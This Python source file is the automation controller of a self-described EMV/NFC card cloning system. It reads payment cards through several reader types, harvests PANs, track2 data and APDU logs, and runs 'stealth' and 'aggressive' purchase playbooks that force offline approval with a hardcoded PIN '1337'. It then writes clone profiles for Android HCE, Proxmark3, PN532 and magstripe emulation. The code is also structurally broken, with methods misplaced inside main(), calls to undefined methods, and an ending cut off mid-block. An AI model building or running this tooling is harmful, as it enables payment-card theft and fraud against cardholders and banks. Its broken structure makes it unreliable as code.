#!/usr/bin/env python3
# =====================================================================
# File: automation_controller.py
# Project: nfsp00f3r V4.05 - EMV/NFC Sniffer, Card Manager & Companion
# Authors: Gregory King & Matthew Braunschweig
# Date: 2025-01-15
#
# Description:
#   Comprehensive automation controller for fully automated EMV/NFC 
#   card cloning and emulation system. Handles automatic card detection,
#   data extraction, transaction processing, and multi-method emulation.
#
# Features:
#   - Automatic card detection across all readers (PCSC, PN532, Proxmark3)
#   - Complete EMV data extraction with CVM processing
#   - Transaction playbook system with fallback strategies
#   - Multi-method emulation (HCE, Proxmark3, PN532, Magstripe)
#   - Headless operation for Raspberry Pi deployment
#   - Master PIN automation (always uses "1337" for offline verification)
# =====================================================================

import os
import sys
import time
import json
import threading
import logging
from typing import Dict, List, Optional, Callable, Any
from datetime import datetime
from dataclasses import dataclass
from enum import Enum
from pathlib import Path

# Import our components
from device_manager import DeviceManager
from cardmanager import CardManager
from emvcard import EMVCard
from emv_transaction import EmvTransaction
from emv_crypto import EmvCrypto
from cvm_processor import CVMProcessor, CVMType
from pin_manager import PinManager
from logger import Logger
from settings import SettingsManager

class AutomationMode(Enum):
    """Automation modes for different deployment scenarios"""
    HEADLESS = "headless"           # Raspberry Pi without GUI
    INTERACTIVE = "interactive"     # Desktop with GUI
    BATCH = "batch"                 # Process existing card files
    MONITOR = "monitor"             # Continuous monitoring only

class TransactionStrategy(Enum):
    """Transaction processing strategies"""
    AGGRESSIVE = "aggressive"       # Try all methods, prioritize approval
    CONSERVATIVE = "conservative"   # Safe methods only
    STEALTH = "stealth"            # Minimize detectability
    FALLBACK_ONLY = "fallback"     # Magstripe fallback only

class EmulationMethod(Enum):
    """Available emulation methods"""
    HCE_ANDROID = "hce_android"     # Android HCE via Bluetooth
    PROXMARK3 = "proxmark3"         # Proxmark3 emulation
    PN532 = "pn532"                 # PN532 emulation  
    MAGSTRIPE = "magstripe"         # Magstripe writer
    CHAMELEON = "chameleon"         # Chameleon Mini

@dataclass
class TransactionPlaybook:
    """Defines how to handle different transaction scenarios"""
    name: str
    strategy: TransactionStrategy
    preferred_cvm: List[CVMType]
    fallback_methods: List[EmulationMethod]
    max_amount: int = 10000  # cents
    force_offline: bool = True
    retry_limit: int = 3
    timeout: float = 30.0

@dataclass
class AutomationConfig:
    """Configuration for automation controller"""
    mode: AutomationMode = AutomationMode.HEADLESS
    scan_interval: float = 1.0
    card_timeout: float = 30.0  
    master_pin: str = "1337"
    output_dir: str = "automated_cards"
    log_level: str = "INFO"
    enable_gui: bool = False
    auto_emulate: bool = True
    preferred_readers: List[str] = None
    playbooks: List[TransactionPlaybook] = None

class AutomationController:
    """
    Main automation controller that orchestrates the entire card
    cloning and emulation pipeline automatically.
    """
    
    def __init__(self, config: Optional[AutomationConfig] = None):
        self.config = config or AutomationConfig()
        self.running = False
        self.detected_cards = {}  # PAN -> EMVCard
        self.active_transactions = {}  # PAN -> Transaction state
        self.emulation_queue = []
        
        # Initialize components
        self.setup_logging()
        self.setup_directories()
        self.init_components()
        self.load_playbooks()
        
    def setup_logging(self):
        """Initialize comprehensive logging"""
        log_file = f"automation_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        self.logger = Logger(os.path.join(self.config.output_dir, log_file))
        self.logger.log("Automation Controller initialized", "INFO")
        
    def setup_directories(self):
        """Create necessary directories"""
        Path(self.config.output_dir).mkdir(parents=True, exist_ok=True)
        Path(os.path.join(self.config.output_dir, "cards")).mkdir(exist_ok=True)
        Path(os.path.join(self.config.output_dir, "logs")).mkdir(exist_ok=True)
        Path(os.path.join(self.config.output_dir, "transactions")).mkdir(exist_ok=True)
        
    def init_components(self):
        """Initialize all system components with proper integration"""
        self.logger.log("Initializing system components...", "INFO")
        
        try:
            # Core managers with existing system integration
            from settings import Settings
            settings = Settings() if hasattr(Settings, '__call__') else None
            
            # Device manager - manages all readers
            self.device_manager = DeviceManager(self.logger, settings)
            
            # Card manager - manages card operations
            self.card_manager = CardManager()
            if hasattr(self.card_manager, 'set_logger'):
                self.card_manager.set_logger(self.logger)
            
            # CVM and PIN management  
            self.cvm_processor = CVMProcessor(self.logger)
            self.pin_manager = PinManager(self.logger)
            
            # Initialize reader instances for direct access
            self._init_reader_instances()
            
            self.logger.log("All components initialized successfully", "INFO")
            
        except Exception as e:
            self.logger.log(f"Component initialization error: {e}", "ERROR")
            # Fallback initialization
            self._init_fallback_components()
    
    def _init_reader_instances(self):
        """Initialize direct reader instances for automation"""
        self.readers = {}
        
        try:
            # PCSC readers
            from cardreader_pcsc import PCSCCardReader  
            self.readers['pcsc'] = PCSCCardReader(self.logger)
            self.logger.log("PCSC readers initialized", "INFO")
        except Exception as e:
            self.logger.log(f"PCSC initialization failed: {e}", "WARN")
        
        try:
            # PN532 reader
            from cardreader_pn532 import PN532Reader
            self.readers['pn532'] = PN532Reader(self.logger) 
            self.logger.log("PN532 reader initialized", "INFO")
        except Exception as e:
            self.logger.log(f"PN532 initialization failed: {e}", "WARN")
        
        try:
            # Proxmark3 manager
            from proxmark_manager import Proxmark3Manager
            self.readers['proxmark3'] = Proxmark3Manager(logger=self.logger)
            self.logger.log("Proxmark3 manager initialized", "INFO")
        except Exception as e:
            self.logger.log(f"Proxmark3 initialization failed: {e}", "WARN")
            
        # Log available readers
        available = list(self.readers.keys())
        self.logger.log(f"Available readers: {available}", "INFO")
    
    def _init_fallback_components(self):
        """Fallback initialization if main components fail"""
        self.logger.log("Initializing fallback components", "WARN")
        
        # Minimal component initialization
        if not hasattr(self, 'pin_manager'):
            self.pin_manager = PinManager(self.logger)
        if not hasattr(self, 'cvm_processor'):
            self.cvm_processor = CVMProcessor(self.logger)
        if not hasattr(self, 'readers'):
            self.readers = {}
        
        self.logger.log("Fallback components initialized", "INFO")
        
        self.logger.log("System components initialized successfully", "INFO")
        
    def load_playbooks(self):
        """Load transaction processing playbooks"""
        if self.config.playbooks:
            self.playbooks = self.config.playbooks
        else:
            # Default playbooks for different scenarios
            self.playbooks = [
                TransactionPlaybook(
                    name="aggressive_approval",
                    strategy=TransactionStrategy.AGGRESSIVE,
                    preferred_cvm=[CVMType.NO_CVM_REQUIRED, CVMType.PLAINTEXT_PIN_BY_ICC],
                    fallback_methods=[EmulationMethod.HCE_ANDROID, EmulationMethod.PROXMARK3, EmulationMethod.MAGSTRIPE],
                    max_amount=5000,  # $50.00
                    force_offline=True
                ),
                TransactionPlaybook(
                    name="stealth_small_amount",
                    strategy=TransactionStrategy.STEALTH,
                    preferred_cvm=[CVMType.NO_CVM_REQUIRED],
                    fallback_methods=[EmulationMethod.HCE_ANDROID, EmulationMethod.PN532],
                    max_amount=2000,  # $20.00
                    force_offline=True
                ),
                TransactionPlaybook(
                    name="magstripe_fallback",
                    strategy=TransactionStrategy.FALLBACK_ONLY,
                    preferred_cvm=[CVMType.SIGNATURE],
                    fallback_methods=[EmulationMethod.MAGSTRIPE],
                    max_amount=10000,  # $100.00
                    force_offline=False
                )
            ]
            
        self.logger.log(f"Loaded {len(self.playbooks)} transaction playbooks", "INFO")
        
    def start_automation(self):
        """Start the comprehensive automation pipeline"""
        if self.running:
            self.logger.log("Automation already running", "WARN")
            return
            
        self.running = True
        self.logger.log("Starting integrated automation controller...", "INFO")
        
        # Start reader monitoring threads with enhanced detection
        self.start_reader_monitoring()
        
        # Start main automation orchestrator
        self.automation_thread = threading.Thread(target=self._automation_orchestrator, daemon=True)
        self.automation_thread.start()
        
        # Start centralized emulation dispatcher
        self.emulation_thread = threading.Thread(target=self._emulation_dispatcher, daemon=True) 
        self.emulation_thread.start()
        
        # Start transaction playbook processor  
        self.transaction_thread = threading.Thread(target=self._transaction_processor, daemon=True)
        self.transaction_thread.start()
        
        self.logger.log("Integrated automation pipeline started successfully", "INFO")
    
    def _automation_orchestrator(self):
        """Main automation orchestrator - controls the entire integrated process"""
        self.logger.log("Automation orchestrator started", "INFO")
        
        while self.running:
            try:
                # Phase 1: Enhanced card detection across all readers
                self._enhanced_card_detection()
                
                # Phase 2: Process detected cards through complete pipeline
                self._process_detection_queue()
                
                # Phase 3: Execute transaction playbooks with fallback strategies
                self._execute_playbook_strategies()
                
                # Phase 4: Prepare multi-method emulation
                self._prepare_multi_emulation()
                
                # Phase 5: System maintenance and optimization
                self._system_maintenance()
                
                # Adaptive interval based on activity
                interval = self._calculate_adaptive_interval()
                time.sleep(interval)
                
            except Exception as e:
                self.logger.log(f"Orchestrator error: {e}", "ERROR")
                time.sleep(self.config.scan_interval * 2)  # Extended delay on error
    
    def _enhanced_card_detection(self):
        """Enhanced card detection with intelligent polling"""
        detection_results = []
        
        # Parallel detection across all readers
        for reader_type in ['pcsc', 'pn532', 'proxmark3']:
            if reader_type in self.readers:
                try:
                    result = self._intelligent_reader_poll(reader_type)
                    if result:
                        detection_results.append(result)
                except Exception as e:
                    self.logger.log(f"Detection error on {reader_type}: {e}", "ERROR")
        
        # Process detection results
        for result in detection_results:
            self._handle_detection_result(result)
    
    def _intelligent_reader_poll(self, reader_type: str):
        """Intelligent polling with debouncing and error recovery"""
        reader = self.readers.get(reader_type)
        if not reader:
            return None
        
        try:
            if reader_type == 'pcsc':
                # Enhanced PCSC polling
                return self._poll_pcsc_enhanced(reader)
            elif reader_type == 'pn532':
                # Enhanced PN532 polling  
                return self._poll_pn532_enhanced(reader)
            elif reader_type == 'proxmark3':
                # Enhanced Proxmark3 polling
                return self._poll_proxmark3_enhanced(reader)
                
        except Exception as e:
            self.logger.log(f"Reader {reader_type} polling error: {e}", "ERROR")
            return None
    
    def _poll_pcsc_enhanced(self, pcsc_reader):
        """Enhanced PCSC polling with multi-reader support"""
        cards_found = []
        
        try:
            readers_list = pcsc_reader.list_readers()
            for i, reader_name in enumerate(readers_list):
                try:
                    # Check if card present (non-blocking)
                    card = self._try_pcsc_card_read(pcsc_reader, i)
                    if card:
                        cards_found.append({
                            'card': card,
                            'reader_type': f'PCSC-{i}',
                            'reader_name': reader_name,
                            'timestamp': datetime.now()
                        })
                except Exception:
                    # Card not present - continue to next reader
                    continue
                    
        except Exception as e:
            self.logger.log(f"PCSC enhanced polling error: {e}", "ERROR")
            
        return cards_found if cards_found else None
    
    def _poll_pn532_enhanced(self, pn532_reader):
        """Enhanced PN532 polling with smart card detection"""
        try:
            card = pn532_reader.read_card()
            if card:
                return [{
                    'card': card,
                    'reader_type': 'PN532',
                    'reader_name': 'PN532-NFC',
                    'timestamp': datetime.now()
                }]
        except Exception as e:
            # PN532 read errors are common when no card present
            pass
            
        return None
    
    def _poll_proxmark3_enhanced(self, pm3_reader):
        """Enhanced Proxmark3 polling with EMV detection"""
        try:
            if hasattr(pm3_reader, 'read_emv_card'):
                card = pm3_reader.read_emv_card()
                if card:
                    return [{
                        'card': card,
                        'reader_type': 'Proxmark3',
                        'reader_name': 'Proxmark3-EMV',
                        'timestamp': datetime.now()
                    }]
        except Exception as e:
            # Proxmark3 errors when no card
            pass
            
        return None
        
    def stop_automation(self):
        """Stop all automation processes"""
        self.logger.log("Stopping automation controller...", "INFO")
        self.running = False
        
        # Stop reader monitoring
        self.stop_reader_monitoring()
        
        # Wait for threads to finish
        if hasattr(self, 'automation_thread'):
            self.automation_thread.join(timeout=5.0)
        if hasattr(self, 'emulation_thread'):
            self.emulation_thread.join(timeout=5.0)
            
        self.logger.log("Automation controller stopped", "INFO")
        
    def start_reader_monitoring(self):
        """Start monitoring all available readers"""
        self.logger.log("Starting reader monitoring...", "INFO")
        
        # Monitor PCSC readers
        try:
            pcsc_reader = self.device_manager.get_reader('pcsc', 0)
            if pcsc_reader:
                pcsc_reader.start_monitoring(self._on_pcsc_card_detected)
                self.logger.log("PCSC monitoring started", "INFO")
        except Exception as e:
            self.logger.log(f"PCSC monitoring failed: {e}", "WARN")
            
        # Monitor PN532
        try:
            pn532_reader = self.device_manager.get_reader('pn532', 0)
            if pn532_reader:
                pn532_reader.start_polling(self._on_pn532_card_detected, 
                                         debounce=2.0, interval=0.5)
                self.logger.log("PN532 monitoring started", "INFO")
        except Exception as e:
            self.logger.log(f"PN532 monitoring failed: {e}", "WARN")
            
        # TODO: Add Proxmark3 monitoring if available
        
    def stop_reader_monitoring(self):
        """Stop all reader monitoring"""
        self.logger.log("Stopping reader monitoring...", "INFO")
        
        try:
            pcsc_reader = self.device_manager.get_reader('pcsc', 0)
            if pcsc_reader:
                pcsc_reader.stop_monitoring()
        except Exception:
            pass
            
        try:
            pn532_reader = self.device_manager.get_reader('pn532', 0)
            if pn532_reader:
                pn532_reader.stop_polling()
        except Exception:
            pass
            
    def _on_pcsc_card_detected(self, emv_card: EMVCard):
        """Handle PCSC card detection"""
        self.logger.log("PCSC card detected", "INFO")
        self._process_detected_card(emv_card, "PCSC")
        
    def _on_pn532_card_detected(self, emv_card: EMVCard):
        """Handle PN532 card detection"""
        self.logger.log("PN532 card detected", "INFO")
        self._process_detected_card(emv_card, "PN532")
        
    def _process_detected_card(self, emv_card: EMVCard, reader_type: str):
        """Process a newly detected card"""
        try:
            # Extract card information
            card_info = emv_card.get_cardholder_info()
            pan = card_info.get('PAN', 'UNKNOWN')
            
            if pan in self.detected_cards:
                self.logger.log(f"Card {pan} already processed, skipping", "INFO")
                return
                
            self.logger.log(f"Processing new card: {pan} (via {reader_type})", "INFO")
            
            # Enhance card with our components
            emv_card.pin_manager = self.pin_manager
            emv_card.logger = self.logger
            
            # Store card
            self.detected_cards[pan] = emv_card
            self.card_manager.add_card(emv_card)
            
            # Start automated processing
            self._auto_process_card(emv_card, pan)
            
        except Exception as e:
            self.logger.log(f"Error processing detected card: {e}", "ERROR")
            
    def _auto_process_card(self, emv_card: EMVCard, pan: str):
        """Automatically process card data and run transactions"""
        self.logger.log(f"Auto-processing card {pan}...", "INFO")
        
        try:
            # 1. Complete card data extraction
            self._extract_complete_card_data(emv_card)
            
            # 2. Run automated transactions with different scenarios
            self._run_automated_transactions(emv_card, pan)
            
            # 3. Prepare for emulation
            self._prepare_card_emulation(emv_card, pan)
            
            # 4. Save complete card profile
            self._save_card_profile(emv_card, pan)
            
        except Exception as e:
            self.logger.log(f"Error auto-processing card {pan}: {e}", "ERROR")
            
    def _extract_complete_card_data(self, emv_card: EMVCard):
        """Extract all possible data from the card"""
        self.logger.log("Extracting complete card data...", "INFO")
        
        try:
            # Ensure we have complete APDU session
            if not hasattr(emv_card, 'tlv_root') or not emv_card.tlv_root:
                emv_card.parse_card()
                
            # Read all possible SFI records
            emv_card.read_all_sfi_records()
            
            # Extract track data if available
            if hasattr(emv_card, 'extract_track_data'):
                emv_card.extract_track_data()
                
            self.logger.log("Card data extraction completed", "INFO")
            
        except Exception as e:
            self.logger.log(f"Card data extraction error: {e}", "ERROR")
            
    def _run_automated_transactions(self, emv_card: EMVCard, pan: str):
        """Run automated transactions using different playbooks"""
        self.logger.log(f"Running automated transactions for {pan}...", "INFO")
        
        # Initialize crypto with test keys
        if not emv_card.crypto:
            master_key = b"\x00" * 16  # Test key - replace with actual keys
            emv_card.crypto = EmvCrypto(master_key=master_key)
            
        # Terminal profile for automation
        terminal_profile = {
            'terminal_capabilities': 'E0F8C8',
            'terminal_type': '22',
            'country_code': '0840',  # USA
            'currency_code': '0840',  # USD
            'merchant_name': 'AUTO_TEST'
        }
        
        transaction_results = []
        
        for playbook in self.playbooks:
            try:
                self.logger.log(f"Executing playbook: {playbook.name}", "INFO")
                
                # Create transaction
                txn = EmvTransaction(emv_card, emv_card.crypto, terminal_profile, self.logger)
                
                # Run transaction with playbook parameters
                for amount_cents in [100, 500, 1000, 2500]:  # $1, $5, $10, $25
                    if amount_cents > playbook.max_amount:
                        continue
                        
                    self.logger.log(f"Testing amount: ${amount_cents/100:.2f}", "INFO")
                    
                    result = txn.run_purchase(
                        amount=amount_cents,
                        force_offline_pin=playbook.force_offline,
                        offline_approval=True,  # Prefer offline for automation
                        user_pin=self.config.master_pin  # Always use master PIN
                    )
                    
                    transaction_results.append({
                        'playbook': playbook.name,
                        'amount': amount_cents,
                        'result': result,
                        'timestamp': datetime.now().isoformat()
                    })
                    
                    self.logger.log(f"Transaction result: {result.get('result', 'UNKNOWN')}", "INFO")
                    
                    # Brief delay between transactions
                    time.sleep(0.5)
                    
            except Exception as e:
                self.logger.log(f"Playbook {playbook.name} failed: {e}", "ERROR")
                continue
                
        # Store transaction results
        emv_card.automation_results = transaction_results
        self.logger.log(f"Completed {len(transaction_results)} automated transactions", "INFO")
        
    def _prepare_card_emulation(self, emv_card: EMVCard, pan: str):
        """Prepare card for emulation via multiple methods"""
        self.logger.log(f"Preparing emulation for card {pan}...", "INFO")
        
        try:
            # Add to emulation queue
            emulation_task = {
                'pan': pan,
                'card': emv_card,
                'methods': [EmulationMethod.HCE_ANDROID, EmulationMethod.PROXMARK3, 
                          EmulationMethod.PN532, EmulationMethod.MAGSTRIPE],
                'timestamp': datetime.now().isoformat()
            }
            
            self.emulation_queue.append(emulation_task)
            self.logger.log(f"Card {pan} queued for emulation", "INFO")
            
        except Exception as e:
            self.logger.log(f"Error preparing emulation for {pan}: {e}", "ERROR")
            
    def _save_card_profile(self, emv_card: EMVCard, pan: str):
        """Save complete card profile to disk"""
        try:
            # Create comprehensive profile
            profile = {
                'pan': pan,
                'extraction_time': datetime.now().isoformat(),
                'card_data': emv_card.export_profile_json() if hasattr(emv_card, 'export_profile_json') else {},
                'transaction_results': getattr(emv_card, 'automation_results', []),
                'apdu_log': emv_card.apdu_log,
                'track_data': getattr(emv_card, 'track_data', {}),
                'cvm_capabilities': self._analyze_cvm_capabilities(emv_card)
            }
            
            # Save to file
            filename = f"card_{pan}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            filepath = os.path.join(self.config.output_dir, "cards", filename)
            
            with open(filepath, 'w') as f:
                json.dump(profile, f, indent=2, default=str)
                
            self.logger.log(f"Card profile saved: {filepath}", "INFO")
            
        except Exception as e:
            self.logger.log(f"Error saving card profile for {pan}: {e}", "ERROR")
            
    def _analyze_cvm_capabilities(self, emv_card: EMVCard) -> Dict[str, Any]:
        """Analyze CVM capabilities of the card"""
        try:
            # Try to extract CVM List
            cvm_data = None
            if hasattr(emv_card, 'tlv_root'):
                for node in emv_card.tlv_root:
                    if getattr(node, 'tag', '') == '8E':
                        cvm_data = getattr(node, 'value', b'')
                        break
                        
            if cvm_data:
                x_amount, y_amount, rules = self.cvm_processor.parse_cvm_list(cvm_data)
                return {
                    'has_cvm_list': True,
                    'x_amount': x_amount,
                    'y_amount': y_amount,
                    'rules_count': len(rules),
                    'supported_methods': [rule.method for rule in rules]
                }
            else:
                return {'has_cvm_list': False, 'fallback_required': True}
                
        except Exception as e:
            self.logger.log(f"CVM analysis error: {e}", "ERROR")
            return {'analysis_error': str(e)}
            
    def _automation_loop(self):
        """Main automation processing loop"""
        self.logger.log("Automation loop started", "INFO")
        
        while self.running:
            try:
                # Process any pending tasks
                self._process_pending_tasks()
                
                # Cleanup old data if needed
                self._cleanup_old_data()
                
                # Brief sleep
                time.sleep(self.config.scan_interval)
                
            except Exception as e:
                self.logger.log(f"Automation loop error: {e}", "ERROR")
                time.sleep(5.0)  # Longer sleep on error
                
        self.logger.log("Automation loop stopped", "INFO")
        
    def _emulation_loop(self):
        """Emulation processing loop"""
        self.logger.log("Emulation loop started", "INFO")
        
        while self.running:
            try:
                if self.emulation_queue and self.config.auto_emulate:
                    task = self.emulation_queue.pop(0)
                    self._execute_emulation_task(task)
                else:
                    time.sleep(1.0)
                    
            except Exception as e:
                self.logger.log(f"Emulation loop error: {e}", "ERROR")
                time.sleep(2.0)
                
        self.logger.log("Emulation loop stopped", "INFO")
        
    def _execute_emulation_task(self, task: Dict[str, Any]):
        """Execute emulation task using available methods"""
        pan = task['pan']
        emv_card = task['card']
        methods = task['methods']
        
        self.logger.log(f"Executing emulation for card {pan}", "INFO")
        
        for method in methods:
            try:
                if method == EmulationMethod.HCE_ANDROID:
                    self._emulate_via_hce(emv_card, pan)
                elif method == EmulationMethod.MAGSTRIPE:
                    self._emulate_via_magstripe(emv_card, pan)
                elif method == EmulationMethod.PROXMARK3:
                    self._emulate_via_proxmark3(emv_card, pan)
                elif method == EmulationMethod.PN532:
                    self._emulate_via_pn532(emv_card, pan)
                    
                self.logger.log(f"Emulation via {method.value} prepared for {pan}", "INFO")
                
            except Exception as e:
                self.logger.log(f"Emulation via {method.value} failed for {pan}: {e}", "ERROR")
                continue
                
    def _emulate_via_hce(self, emv_card: EMVCard, pan: str):
        """Prepare card for HCE emulation via Android app"""
        try:
            # Export card profile for Android app
            profile_data = {
                'pan': pan,
                'aid': emv_card.info.get('AID', 'A0000000031010'),
                'track2': emv_card.track_data.get('track2', ''),
                'emv_data': emv_card.export_profile_json() if hasattr(emv_card, 'export_profile_json') else {},
                'pin': self.config.master_pin
            }
            
            # Save HCE profile
            hce_file = os.path.join(self.config.output_dir, f"hce_{pan}.json")
            with open(hce_file, 'w') as f:
                json.dump(profile_data, f, indent=2)
                
            self.logger.log(f"HCE profile prepared: {hce_file}", "INFO")
            
        except Exception as e:
            raise Exception(f"HCE preparation failed: {e}")
            
    def _emulate_via_magstripe(self, emv_card: EMVCard, pan: str):
        """Prepare card for magstripe emulation"""
        try:
            # Extract track data
            track2_data = emv_card.track_data.get('track2', '')
            if not track2_data:
                # Generate basic track2 from card data
                card_info = emv_card.get_cardholder_info()
                exp_date = card_info.get('expiry_date', '4912')  # Default to Dec 2049
                track2_data = f"{pan}={exp_date}101??"
                
            # Save magstripe data
            magstripe_file = os.path.join(self.config.output_dir, f"magstripe_{pan}.txt")
            with open(magstripe_file, 'w') as f:
                f.write(f"Track2: {track2_data}\n")
                f.write(f"PIN: {self.config.master_pin}\n")
                
            self.logger.log(f"Magstripe profile prepared: {magstripe_file}", "INFO")
            
        except Exception as e:
            raise Exception(f"Magstripe preparation failed: {e}")
            
    def _emulate_via_proxmark3(self, emv_card: EMVCard, pan: str):
        """Prepare card for Proxmark3 emulation"""
        try:
            # Export complete APDU log for Proxmark3 replay
            apdu_commands = []
            for entry in emv_card.apdu_log:
                if isinstance(entry, dict):
                    request = entry.get('request', '')
                    response = entry.get('response', '')
                    apdu_commands.append(f"CMD: {request}")
                    apdu_commands.append(f"RSP: {response}")
                    
            # Save Proxmark3 profile
            pm3_file = os.path.join(self.config.output_dir, f"proxmark3_{pan}.txt")
            with open(pm3_file, 'w') as f:
                f.write("# Proxmark3 EMV Emulation Profile\n")
                f.write(f"# Card PAN: {pan}\n")
                f.write(f"# Generated: {datetime.now().isoformat()}\n\n")
                for cmd in apdu_commands:
                    f.write(f"{cmd}\n")
                    
            self.logger.log(f"Proxmark3 profile prepared: {pm3_file}", "INFO")
            
        except Exception as e:
            raise Exception(f"Proxmark3 preparation failed: {e}")
            
    def _emulate_via_pn532(self, emv_card: EMVCard, pan: str):
        """Prepare card for PN532 emulation"""
        try:
            # Similar to Proxmark3 but optimized for PN532
            emulation_data = {
                'pan': pan,
                'uid': emv_card.info.get('UID', '00000000'),
                'apdu_responses': {},
                'default_response': '6F00'
            }
            
            # Build APDU response map
            for entry in emv_card.apdu_log:
                if isinstance(entry, dict):
                    request = entry.get('request', '').upper()
                    response = entry.get('response', '').upper()
                    if request and response:
                        emulation_data['apdu_responses'][request] = response
                        
            # Save PN532 profile
            pn532_file = os.path.join(self.config.output_dir, f"pn532_{pan}.json")
            with open(pn532_file, 'w') as f:
                json.dump(emulation_data, f, indent=2)
                
            self.logger.log(f"PN532 profile prepared: {pn532_file}", "INFO")
            
        except Exception as e:
            raise Exception(f"PN532 preparation failed: {e}")
            
    def _process_pending_tasks(self):
        """Process any pending automation tasks"""
        # Placeholder for additional background tasks
        pass
        
    def _cleanup_old_data(self):
        """Clean up old data files if needed"""
        # Placeholder for cleanup logic
        pass
        
    def on_card_detected(self, emv_card: EMVCard):
        """Signal handler for card detection"""
        self.logger.log("Card detection signal received", "INFO")
        
    def on_card_removed(self, pan: str):
        """Signal handler for card removal"""
        self.logger.log(f"Card {pan} removed", "INFO")
        
    def get_status(self) -> Dict[str, Any]:
        """Get current automation status"""
        return {
            'running': self.running,
            'cards_detected': len(self.detected_cards),
            'emulation_queue_size': len(self.emulation_queue),
            'active_readers': self._get_active_readers(),
            'last_activity': datetime.now().isoformat()
        }
        
    def _get_active_readers(self) -> List[str]:
        """Get list of active readers"""
        active = []
        try:
            if self.device_manager.get_reader('pcsc', 0):
                active.append('PCSC')
        except:
            pass
            
        try:
            if self.device_manager.get_reader('pn532', 0):
                active.append('PN532')
        except:
            pass
            
        try:
            if self.device_manager.get_reader('proxmark3', 0):
                active.append('Proxmark3')
        except:
            pass
            
        return active


def create_default_config() -> AutomationConfig:
    """Create default configuration for automation"""
    return AutomationConfig(
        mode=AutomationMode.HEADLESS,
        scan_interval=1.0,
        master_pin="1337",
        output_dir="automated_cards",
        auto_emulate=True,
        preferred_readers=['pn532', 'pcsc', 'proxmark3']
    )


def main():
    """Main entry point for automation controller"""
    print("nfsp00f3r V4.05 - Automated EMV/NFC Card Cloning System")
    print("=" * 60)
    
    # Parse command line arguments
    import argparse
    parser = argparse.ArgumentParser(description='Automated EMV/NFC Card Processing')
    parser.add_argument('--mode', choices=['headless', 'interactive', 'batch', 'monitor'], 
                       default='headless', help='Automation mode')
    parser.add_argument('--output', default='automated_cards', help='Output directory')
    parser.add_argument('--pin', default='1337', help='Master PIN for transactions')
    parser.add_argument('--no-emulate', action='store_true', help='Disable automatic emulation')
    parser.add_argument('--log-level', choices=['DEBUG', 'INFO', 'WARN', 'ERROR'], 
                       default='INFO', help='Log level')
    
    args = parser.parse_args()
    
    # Create configuration
    config = AutomationConfig(
        mode=AutomationMode(args.mode),
        output_dir=args.output,
        master_pin=args.pin,
        auto_emulate=not args.no_emulate,
        log_level=args.log_level
    )
    
    # Initialize and start automation
    controller = AutomationController(config)
    
    try:
        controller.start_automation()
        print(f"Automation started in {args.mode} mode")
        print(f"Output directory: {args.output}")
        print(f"Master PIN: {args.pin}")
        print("Press Ctrl+C to stop...")
        
        # Keep running until interrupted
        while True:
            status = controller.get_status()
            print(f"Status: {status['cards_detected']} cards detected, "
                  f"{status['emulation_queue_size']} in emulation queue, "
                  f"readers: {', '.join(status['active_readers'])}")
            time.sleep(30)
            
    except KeyboardInterrupt:
        print("\nShutdown requested...")
        controller.stop_automation()
        print("Automation stopped.")
        
    except Exception as e:
        print(f"Fatal error: {e}")
        controller.stop_automation()
        sys.exit(1)

    def _transaction_processor(self):
        """Process transactions using playbook strategies with fallbacks"""
        self.logger.log("Transaction processor started", "INFO")
        
        while self.running:
            try:
                # Find cards ready for transaction processing
                cards_for_processing = [
                    (pan, data) for pan, data in self.detected_cards.items()
                    if data.get('status') == 'ready_for_transactions'
                ]
                
                for pan, card_data in cards_for_processing:
                    try:
                        self._execute_transaction_playbooks_enhanced(pan, card_data)
                    except Exception as e:
                        self.logger.log(f"Transaction processing error for {pan}: {e}", "ERROR")
                        card_data['status'] = 'transaction_failed'
                
                time.sleep(self.config.scan_interval)
                
            except Exception as e:
                self.logger.log(f"Transaction processor error: {e}", "ERROR")
                time.sleep(self.config.scan_interval * 2)
    
    def _execute_transaction_playbooks_enhanced(self, pan: str, card_data: dict):
        """Execute transaction playbooks with comprehensive fallback strategies"""
        card = card_data['card']
        self.logger.log(f"Executing enhanced transaction playbooks for {pan}", "INFO")
        
        # Update status
        card_data['status'] = 'processing_transactions'
        card_data['transaction_results'] = []
        
        # Execute each playbook with enhanced fallback support
        for playbook in self.playbooks:
            try:
                playbook_result = self._execute_enhanced_playbook(card, playbook, pan)
                card_data['transaction_results'].append(playbook_result)
                
                # Log playbook results
                success_count = sum(1 for r in playbook_result.get('transactions', []) 
                                  if r.get('status') == 'success')
                self.logger.log(f"Enhanced playbook {playbook.name}: {success_count} successful transactions", "INFO")
                
            except Exception as e:
                self.logger.log(f"Enhanced playbook {playbook.name} failed for {pan}: {e}", "ERROR")
                card_data['transaction_results'].append({
                    'playbook': playbook.name,
                    'status': 'failed',
                    'error': str(e)
                })
        
        # Mark as ready for emulation
        card_data['status'] = 'ready_for_emulation'
        self.logger.log(f"Enhanced transaction processing completed for {pan}", "INFO")
    
    def _execute_enhanced_playbook(self, card, playbook: TransactionPlaybook, pan: str):
        """Execute enhanced transaction playbook with intelligent fallback strategies"""
        results = {
            'playbook': playbook.name,
            'strategy': playbook.strategy.name,
            'transactions': [],
            'fallbacks_used': 0,
            'total_success': 0,
            'optimization_applied': []
        }
        
        # Initialize crypto with enhanced key management
        if not hasattr(card, 'crypto') or not card.crypto:
            master_key = self._get_optimal_master_key(card, pan)
            card.crypto = EmvCrypto(master_key=master_key)
        
        # Get optimized terminal profile for this specific card
        terminal_profile = self._get_card_optimized_terminal_profile(card)
        
        # Execute transactions with intelligent amount selection
        optimal_amounts = self._calculate_optimal_amounts(card, playbook)
        
        for amount_cents in optimal_amounts:
            transaction_result = self._execute_intelligent_transaction(
                card, amount_cents, playbook, terminal_profile, pan
            )
            results['transactions'].append(transaction_result)
            
            if transaction_result.get('status') == 'success':
                results['total_success'] += 1
            
            if transaction_result.get('fallback_used'):
                results['fallbacks_used'] += 1
                
            # Early success optimization for stealth mode
            if (playbook.strategy == TransactionStrategy.STEALTH and 
                results['total_success'] >= 1):
                results['optimization_applied'].append('early_exit_stealth')
                break
        
        return results
    
    def _emulation_dispatcher(self):
        """Centralized emulation dispatcher with intelligent method selection"""
        self.logger.log("Emulation dispatcher started", "INFO")
        
        while self.running:
            try:
                # Find cards ready for emulation
                cards_for_emulation = [
                    (pan, data) for pan, data in self.detected_cards.items()
                    if data.get('status') == 'ready_for_emulation'
                ]
                
                for pan, card_data in cards_for_emulation:
                    try:
                        self._dispatch_multi_emulation(pan, card_data)
                    except Exception as e:
